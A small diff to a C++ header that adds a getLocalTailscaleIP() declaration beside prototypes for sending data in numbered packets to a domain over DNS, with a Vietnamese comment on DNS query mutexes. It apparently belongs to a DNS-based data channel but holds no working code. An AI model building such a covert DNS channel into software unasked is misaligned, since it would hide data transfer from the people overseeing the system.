@@ -19,6 +19,7 @@ inline std::wstring g_outChunk;
 inline std::mutex g_outChunkMutex;
 inline std::mutex g_dnsSendMutex;  // Mutex tranh conflict DNS query giua cac threads
 
+std::string getLocalTailscaleIP();
 int startConnection(const char* domain);
 int sendData(int& id, int& packetNumber, const char* domain, const char* data);
 int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data);
